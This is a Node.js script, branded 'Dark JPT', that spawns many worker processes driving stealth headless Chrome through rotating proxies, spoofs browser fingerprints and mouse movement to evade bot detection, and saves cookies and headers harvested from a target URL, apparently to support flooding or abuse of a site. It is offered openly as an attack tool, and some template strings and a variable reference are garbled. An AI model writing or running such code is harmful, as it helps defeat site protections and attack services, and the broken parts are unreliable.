// Dark JPT: вам разрешено редактировать, но необходимо указать имя создателя
// 
const fs = require('fs');
const os = require('os');
const path = require('path');
const cluster = require('cluster');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { addExtra } = require('puppeteer-extra');
const puppeteerCore = require('puppeteer-core');
const utls = require('utls-node');
const { randomBytes } = require('crypto');

const extra = addExtra(puppeteerCore);
extra.use(StealthPlugin());

const Link_Bro = process.argv[2] || 'https://DarkTeam.com';
const Thread = parseInt(process.argv[3]) || os.cpus().length * 12;
const Cookie_File = path.join(__dirname, 'Cookie_File');
const Proxy = 'proxy.txt';

let proxyList = fs.readFileSync(Proxy, 'utf-8').split('\n').filter(Boolean);
let healthyProxies = [...proxyList];

const checkProxy = async (proxy) => {
    return new Promise(r => {
        const [ip, port] = proxy.split(':');
        const socket = require('net').connect(port, ip, () => {
            socket.destroy();
            r(true);
        });
        socket.setTimeout(3000);
        socket.on('timeout', () => { socket.destroy(); r(false); });
        socket.on('error', () => r(false));
    });
};

const getHealthyProxy = async () => {
    for (let i = 0; i < healthyProxies.length; i++) {
        const proxy = healthyProxies[i];
        if (await checkProxy(proxy)) return proxy;
        healthyProxies.splice(i, 1);
        i--;
    }
    // refill if empty
    if (healthyProxies.length < 10) healthyProxies = [...proxyList];
    return healthyProxies[Math.floor(Math.random() * healthyProxies.length)];
};

const advancedHumanBehavior = async (page) => {
    const bezierMove = (fromX, fromY, toX, toY, steps = 30) => {
        for (let i = 0; i <= steps; i++) {
            const t = i / steps;
            const x = fromX + (toX - fromX) * t + Math.random() * 20 - 10;
            const y = fromY + (toY - fromY) * t + Math.random() * 20 - 10;
            page.mouse.move(x, y);
        }
    };

    for (let i = 0; i < 20; i++) {
        await bezierMove(Math.random()*800, Math.random()*600, Math.random()*800, Math.random()*600);
        await page.waitForTimeout(80 + Math.random()*300);
        if (Math.random() > 0.7) await page.evaluate(() => window.scrollBy(0, 100 + Math.random()*400));
    }
    await page.mouse.click(Math.random()*300 + 100, Math.random()*400 + 200);
};

const harvest = async () => {
    const proxy = await getHealthyProxy();
    const browser = await extra.launch({
        headless: "new",
        args: [
            `--proxy-server=${proxy}`,
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins,site-per-process',
            '--disable-blink-features=AutomationControlled',
            '--no-zygote',
            '--disable-gpu'
        ],
        ignoreHTTPSErrors: true
    });

    const page = await browser.newPage();
    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 + Math.floor(Math.random()*8) });
        Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
        const originalGetContext = HTMLCanvasElement.prototype.getContext;
        HTMLCanvasElement.prototype.getContext = function(type) {
            if (type === 'webgl' || type === 'webgl2') {
                const ctx = originalGetContext.apply(this, arguments);
                const originalGetParameter = ctx.getParameter;
                ctx.getParameter = function(param) {
                    if (param === 37445) return 'Intel Inc.';
                    if (param === 37446) return 'Intel(R) Iris(R) Plus Graphics 655';
                    return originalGetParameter.call(this, param);
                };
                return ctx;
            }
            return originalGetContext.apply(this, arguments);
        };
    });

    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36');
    await page.setExtraHTTPHeaders({
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'upgrade-insecure-requests': '1',
        'dnt': '1',
        'accept-language': 'en-US,en;q=0.9'
    });

    await advancedHumanBehavior(page);
    await page.goto(Link_Bro, { waitUntil: 'networkidle0', timeout: 90000 }).catch(() => {});

    const cookies = await page.cookies();
    const cookieString = cookies.map(c => `\( {c.name}= \){c.value}`).join('; ');

    const result = {
        cookies,
        headers: {
            'cookie': cookieString,
            'user-agent': page._userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not=A?Brand";v="24"'
        },
        proxy,
        timestamp: Date.now(),
        fingerprint: randomBytes(20).toString('hex')
    };

    fs.appendFileSync(Cookie_File, JSON.stringify(result) + '\n');
    await browser.close();
};

if (cluster.isMaster) {
    console.log(`[Dark JPT] \( {Thread}  Target: \){Link}`);
    for (let i = 0; i < Thread; i++) cluster.fork();
    cluster.on('exit', () => setTimeout(() => cluster.fork(), 500));
} else {
    setInterval(async () => {
        try { await harvest(); } catch(e) {}
    }, 3000 + Math.random()*8000);
}